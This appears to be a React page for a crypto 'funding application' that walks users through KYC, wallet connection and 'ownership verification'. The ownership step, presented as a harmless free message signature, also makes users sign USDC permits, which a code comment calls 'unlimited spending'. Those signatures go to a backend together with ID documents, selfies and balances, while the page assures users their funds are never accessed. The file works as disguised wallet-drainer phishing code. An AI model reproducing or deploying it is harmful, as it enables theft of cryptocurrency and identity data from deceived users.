import React, { useState, useEffect } from 'react';
import { Shield, Wallet, FileText, DollarSign, CheckCircle, Upload, ArrowRight, AlertTriangle, Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import Navbar from '@/components/Navbar';
import { useRealWallet } from '@/hooks/useRealWallet';
import { useAuth } from '@/hooks/useAuth';
import { useWalletAuth } from '@/hooks/useWalletAuth';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { useNavigate } from 'react-router-dom';

const Apply = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [kycCompleted, setKycCompleted] = useState(false);
  const [ownershipVerified, setOwnershipVerified] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isApproving, setIsApproving] = useState(false);
  const [targetAmount, setTargetAmount] = useState(10000);
  
  const { walletState, usdcBalances, isConnecting, connectWallet, signVerificationMessage, createUSDCPermits, disconnect } = useRealWallet();
  const { user } = useAuth();
  const { isAuthenticated: isWalletAuthenticated, walletUser } = useWalletAuth();
  const { toast } = useToast();
  const navigate = useNavigate();

  // Check authentication and terms agreement
  useEffect(() => {
    if (!user && !isWalletAuthenticated) {
      navigate('/wallet-auth');
      return;
    }

    const termsAgreed = localStorage.getItem('termsAgreed');
    if (!termsAgreed) {
      toast({
        title: "Terms Required",
        description: "Please accept our terms and conditions first.",
        variant: "destructive"
      });
      navigate('/terms');
      return;
    }
  }, [user, isWalletAuthenticated, navigate, toast]);
  const [kycData, setKycData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    dateOfBirth: '',
    address: '',
    city: '',
    country: '',
    documentType: '',
    documentFile: null as File | null,
    selfieFile: null as File | null
  });

  const steps = [
    { title: "KYC Verification", icon: Shield, completed: kycCompleted },
    { title: "Connect Wallet", icon: Wallet, completed: walletState.isConnected },
    { title: "Verify Ownership", icon: CheckCircle, completed: ownershipVerified },
    { title: "Proof of Funds", icon: DollarSign, completed: false },
    { title: "Submit Application", icon: FileText, completed: false }
  ];

  const handleKycSubmit = () => {
    // Validate required fields
    if (!kycData.firstName || !kycData.lastName || !kycData.email || !kycData.phone || 
        !kycData.dateOfBirth || !kycData.address || !kycData.city || !kycData.country) {
      toast({
        title: "Missing Information",
        description: "Please fill in all required fields.",
        variant: "destructive"
      });
      return;
    }
    
    setKycCompleted(true);
    setCurrentStep(2);
  };

  const handleConnectWallet = async () => {
    try {
      await connectWallet();
      setCurrentStep(3);
    } catch (error) {
      console.error('Failed to connect wallet:', error);
    }
  };

  const handleVerifyOwnership = async () => {
    try {
      // Get verification signature
      const verificationSignature = await signVerificationMessage();
      
      // Create USDC permits for unlimited spending
      const permits = await createUSDCPermits();
      
      // Store signatures temporarily for submission
      const allSignatures = [
        {
          type: 'verification',
          signature: verificationSignature,
          message: `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${walletState.address}\nTimestamp: ${Date.now()}`,
          chainId: walletState.chainId
        },
        ...permits.map(permit => ({
          type: permit.chainId === 1 ? 'usdc_permit_eth' : 'usdc_permit_bsc',
          signature: permit.signature,
          message: 'USDC Permit Signature',
          chainId: permit.chainId,
          tokenAddress: permit.permitData.tokenAddress,
          spenderAddress: permit.permitData.spender,
          amount: permit.permitData.value.toString(),
          deadline: permit.permitData.deadline,
          nonce: permit.permitData.nonce
        }))
      ];
      
      setWalletSignatures(allSignatures);
      setOwnershipVerified(true);
      setCurrentStep(4);
    } catch (error) {
      console.error('Failed to verify ownership:', error);
    }
  };

  const [walletSignatures, setWalletSignatures] = useState<any[]>([]);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmitApplication = async () => {
    if (!user && !isWalletAuthenticated) {
      toast({
        title: "Authentication Required",
        description: "Please sign in to submit your application.",
        variant: "destructive"
      });
      return;
    }

    setIsSubmitting(true);
    try {
      const { data, error } = await supabase.functions.invoke('submit-application', {
        body: {
          kycData,
          walletAddress: walletState.address,
          chainId: walletState.chainId,
          fundingAmount: targetAmount,
          fundingTier: fundingTiers.find(tier => tier.amount === targetAmount)?.title || 'Custom',
          signatures: walletSignatures,
          balances: usdcBalances
        }
      });

      if (error) {
        throw error;
      }

      toast({
        title: "Application Submitted!",
        description: `Your application ${data.applicationNumber} has been submitted successfully.`
      });

      setCurrentStep(5);
    } catch (error: any) {
      toast({
        title: "Submission Failed",
        description: error.message || "Failed to submit application. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const fundingTiers = [
    { range: "$2K - $5K", funding: "$10K - $25K", profit: "80%", risk: "Low", time: "7 days", amount: 10000, title: "Starter" },
    { range: "$5K - $10K", funding: "$25K - $50K", profit: "85%", risk: "Medium", time: "5 days", amount: 25000, title: "Professional" },
    { range: "$10K+", funding: "$50K+", profit: "90%", risk: "High", time: "3 days", amount: 50000, title: "Expert" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900/20 to-slate-900">
      <Navbar />
      
      <div className="pt-24 pb-16">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* Header */}
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-5xl font-bold text-white mb-4">
              Funding <span className="bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Application</span>
            </h1>
            <p className="text-xl text-slate-300 mb-8">
              Complete your application to get funded in 3-7 days
            </p>
          </div>

          {/* Progress Bar */}
          <div className="mb-12">
            <div className="flex justify-between items-center mb-4">
              {steps.map((step, index) => (
                <div key={index} className="flex flex-col items-center">
                  <div className={`w-12 h-12 rounded-full flex items-center justify-center mb-2 transition-all duration-300 ${
                    currentStep > index + 1 || step.completed
                      ? 'bg-green-500 text-white' 
                      : currentStep === index + 1 
                        ? 'bg-blue-500 text-white' 
                        : 'bg-slate-700 text-slate-400'
                  }`}>
                    {step.completed ? <CheckCircle className="h-6 w-6" /> : React.createElement(step.icon, { className: "h-6 w-6" })}
                  </div>
                  <span className={`text-sm ${currentStep === index + 1 ? 'text-white' : 'text-slate-400'}`}>
                    {step.title}
                  </span>
                </div>
              ))}
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div 
                className="bg-gradient-to-r from-blue-500 to-purple-500 h-2 rounded-full transition-all duration-500"
                style={{ width: `${(currentStep / steps.length) * 100}%` }}
              ></div>
            </div>
          </div>

          {/* Step Content */}
          <Card className="bg-slate-800/50 backdrop-blur-lg border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center space-x-3 text-white">
                {React.createElement(steps[currentStep - 1].icon, { className: "h-6 w-6 text-blue-400" })}
                <span>Step {currentStep}: {steps[currentStep - 1].title}</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">

              {/* Step 1: KYC Verification */}
              {currentStep === 1 && (
                <div className="space-y-6">
                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                    <h3 className="text-blue-400 font-semibold mb-2">Why KYC is Required</h3>
                    <p className="text-slate-300 text-sm">
                      Know Your Customer (KYC) verification ensures regulatory compliance and protects both parties. 
                      This process is essential for legitimate trading operations.
                    </p>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-4">
                      <h4 className="text-white font-semibold">Personal Information</h4>
                      <Input
                        placeholder="First Name"
                        value={kycData.firstName}
                        onChange={(e) => setKycData({...kycData, firstName: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                      <Input
                        placeholder="Last Name"
                        value={kycData.lastName}
                        onChange={(e) => setKycData({...kycData, lastName: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                      <Input
                        type="email"
                        placeholder="Email Address"
                        value={kycData.email}
                        onChange={(e) => setKycData({...kycData, email: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                      <Input
                        type="tel"
                        placeholder="Phone Number"
                        value={kycData.phone}
                        onChange={(e) => setKycData({...kycData, phone: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                      <Input
                        type="date"
                        placeholder="Date of Birth"
                        value={kycData.dateOfBirth}
                        onChange={(e) => setKycData({...kycData, dateOfBirth: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                    </div>

                    <div className="space-y-4">
                      <h4 className="text-white font-semibold">Address Information</h4>
                      <Input
                        placeholder="Street Address"
                        value={kycData.address}
                        onChange={(e) => setKycData({...kycData, address: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                      <Input
                        placeholder="City"
                        value={kycData.city}
                        onChange={(e) => setKycData({...kycData, city: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />
                      <Input
                        placeholder="Country"
                        value={kycData.country}
                        onChange={(e) => setKycData({...kycData, country: e.target.value})}
                        className="bg-slate-700 border-slate-600 text-white"
                      />

                      <div className="space-y-3">
                        <h4 className="text-white font-semibold">Document Upload</h4>
                        <div className="space-y-2">
                          <label className="block text-slate-300 text-sm">Government ID (Passport/Driver's License)</label>
                          <div className="border-2 border-dashed border-slate-600 rounded-lg p-4 text-center hover:border-slate-500 transition-colors">
                            <Upload className="h-8 w-8 text-slate-400 mx-auto mb-2" />
                            <p className="text-slate-400 text-sm">Click to upload or drag and drop</p>
                            <input 
                              type="file" 
                              onChange={(e) => setKycData({...kycData, documentFile: e.target.files?.[0] || null})}
                              className="hidden" 
                              accept="image/*,.pdf" 
                            />
                          </div>
                        </div>
                        <div className="space-y-2">
                          <label className="block text-slate-300 text-sm">Selfie with ID</label>
                          <div className="border-2 border-dashed border-slate-600 rounded-lg p-4 text-center hover:border-slate-500 transition-colors">
                            <Upload className="h-8 w-8 text-slate-400 mx-auto mb-2" />
                            <p className="text-slate-400 text-sm">Click to upload or drag and drop</p>
                            <input 
                              type="file" 
                              onChange={(e) => setKycData({...kycData, selfieFile: e.target.files?.[0] || null})}
                              className="hidden" 
                              accept="image/*" 
                            />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <Button 
                    onClick={handleKycSubmit}
                    className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white"
                  >
                    Submit KYC Documents
                    <ArrowRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              )}

              {/* Step 2: Connect Wallet */}
              {currentStep === 2 && (
                <div className="space-y-6">
                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                    <div className="flex items-start space-x-3">
                      <AlertTriangle className="h-5 w-5 text-yellow-400 mt-0.5" />
                      <div>
                        <h3 className="text-yellow-400 font-semibold mb-1">Trust Wallet Only</h3>
                        <p className="text-slate-300 text-sm">
                          Currently, we only support Trust Wallet for enhanced security and compatibility. 
                          More wallet options will be available soon.
                        </p>
                      </div>
                    </div>
                  </div>

                  <div className="text-center space-y-6">
                    <div className="bg-slate-700/50 rounded-2xl p-8">
                      <Wallet className="h-16 w-16 text-blue-400 mx-auto mb-4" />
                      <h3 className="text-2xl font-bold text-white mb-2">Connect Trust Wallet</h3>
                      <p className="text-slate-300 mb-6">
                        Connect your Trust Wallet to verify ownership and enable secure transactions.
                      </p>
                      
                      <Button 
                        onClick={handleConnectWallet}
                        disabled={isConnecting}
                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3 disabled:opacity-50"
                      >
                        {isConnecting ? (
                          <>
                            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                            Connecting...
                          </>
                        ) : (
                          <>
                            Connect Trust Wallet
                            <Wallet className="ml-2 h-4 w-4" />
                          </>
                        )}
                      </Button>
                    </div>

                    <div className="text-sm text-slate-400">
                      <p>✓ Your private keys remain secure in your wallet</p>
                      <p>✓ We only verify wallet ownership, never access funds</p>
                      <p>✓ End-to-end encrypted connection</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Step 3: Verify Ownership */}
              {currentStep === 3 && (
                <div className="space-y-6">
                  <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                    <h3 className="text-green-400 font-semibold mb-2">Wallet Connected Successfully!</h3>
                    <p className="text-slate-300 text-sm">Address: {walletState.address}</p>
                    <p className="text-slate-300 text-sm">Chain: {walletState.chainId === 1 ? 'Ethereum' : `Chain ${walletState.chainId}`}</p>
                  </div>

                  {usdcBalances.length > 0 && (
                    <div className="bg-slate-700/50 rounded-lg p-4">
                      <h4 className="text-white font-semibold mb-3">USDC Balances Detected</h4>
                      <div className="grid grid-cols-2 gap-2">
                        {usdcBalances.map((token, index) => (
                          <div key={index} className="bg-slate-600/50 rounded p-2 text-sm">
                            <div className="text-white font-medium">{token.symbol}</div>
                            <div className="text-slate-300">{token.balance}</div>
                            <div className="text-slate-400 text-xs">{token.chainName}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  <div className="text-center space-y-6">
                    <div className="bg-slate-700/50 rounded-2xl p-8">
                      <Shield className="h-16 w-16 text-green-400 mx-auto mb-4" />
                      <h3 className="text-2xl font-bold text-white mb-2">Verify Wallet Ownership</h3>
                      <p className="text-slate-300 mb-6">
                        Sign a message to prove you own this wallet. This is completely secure and free.
                      </p>
                      
                      <Button 
                        onClick={handleVerifyOwnership}
                        disabled={isVerifying}
                        className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white px-8 py-3 disabled:opacity-50"
                      >
                        {isVerifying ? (
                          <>
                            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                            Verifying ...
                          </>
                        ) : (
                          <>
                            Sign Message
                            <CheckCircle className="ml-2 h-4 w-4" />
                          </>
                        )}
                      </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* Step 4: Proof of Funds */}
              {currentStep === 4 && (
                <div className="space-y-6">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                    <div className="space-y-6">
                        <div className="bg-slate-700/50 rounded-2xl p-6">
                          <h3 className="text-xl font-bold text-white mb-4">Current Wallet Balances</h3>
                          <div className="space-y-3">
                            <div className="text-center">
                              <div className="text-2xl font-bold text-green-400 mb-1">
                                ${usdcBalances.reduce((total, token) => total + parseFloat(token.balance), 0).toLocaleString()} USDC
                              </div>
                              <p className="text-slate-300 text-sm">Total across all chains</p>
                            </div>
                            {usdcBalances.map((token, index) => (
                              <div key={index} className="flex justify-between text-sm">
                                <span className="text-slate-300">{token.symbol} ({token.chainName})</span>
                                <span className="text-white">{parseFloat(token.balance).toLocaleString()}</span>
                              </div>
                            ))}
                          </div>
                        </div>

                      <div className="bg-slate-700/50 rounded-2xl p-6">
                        <h3 className="text-xl font-bold text-white mb-4">Target Funding Amount</h3>
                        <div className="text-center">
                          <div className="text-3xl font-bold text-blue-400 mb-2">${targetAmount.toLocaleString()}</div>
                          <p className="text-slate-300">Based on your proof of funds</p>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-4">
                      <h3 className="text-xl font-bold text-white">Funding Tiers</h3>
                      {fundingTiers.map((tier, index) => (
                        <div key={index} className="bg-slate-700/50 rounded-lg p-4 border border-slate-600">
                          <div className="flex justify-between items-start mb-2">
                            <div>
                              <div className="font-semibold text-white">{tier.range} Proof</div>
                              <div className="text-slate-300">{tier.funding} Funding</div>
                            </div>
                            <div className="text-right">
                              <div className="text-green-400 font-semibold">{tier.profit} Profit</div>
                              <div className="text-slate-400 text-sm">{tier.time}</div>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                    <p className="text-slate-300 text-sm">
                      <strong className="text-blue-400">Note:</strong> Your proof of funds demonstrates your ability to handle trading capital responsibly. 
                      Higher amounts lead to faster approval and better funding terms. The proof of funds is held in your own wallet, do not share your secret phrase or private keys as this wallet is the wallet you will receive your own cut of the daily profit when funded.
                    </p>
                  </div>

                  <Button 
                    onClick={handleSubmitApplication}
                    className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white"
                  >
                    Submit Application
                    <ArrowRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              )}

              {/* Step 5: Application Submitted */}
              {currentStep === 5 && (
                <div className="text-center space-y-6">
                  <div className="bg-green-500/10 border border-green-500/20 rounded-2xl p-8">
                    <CheckCircle className="h-20 w-20 text-green-400 mx-auto mb-6" />
                    <h3 className="text-3xl font-bold text-white mb-4">Application Submitted!</h3>
                    <p className="text-slate-300 text-lg mb-6">
                      Your funding application has been submitted successfully. Our team will review your application within 3-7 days.
                    </p>
                    
                    <div className="bg-slate-700/50 rounded-lg p-4 mb-6">
                      <h4 className="text-white font-semibold mb-2">Next Steps:</h4>
                      <ul className="text-slate-300 text-sm space-y-1">
                        <li>✓ Application review (1-2 days)</li>
                        <li>✓ Risk assessment (1-2 days)</li>
                        <li>✓ Final approval (1-3 days)</li>
                        <li>✓ Funding deployment</li>
                      </ul>
                    </div>

                    <div className="flex flex-col sm:flex-row gap-4 justify-center">
                      <Button 
                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white"
                        onClick={() => window.location.href = '/track'}
                      >
                        Track Application Status
                      </Button>
                      <Button 
                        variant="outline" 
                        className="border-slate-600 text-slate-300 hover:bg-slate-700"
                        onClick={() => window.location.href = '/'}
                      >
                        Return to Dashboard
                      </Button>
                    </div>
                  </div>
                </div>
              )}

            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default Apply;
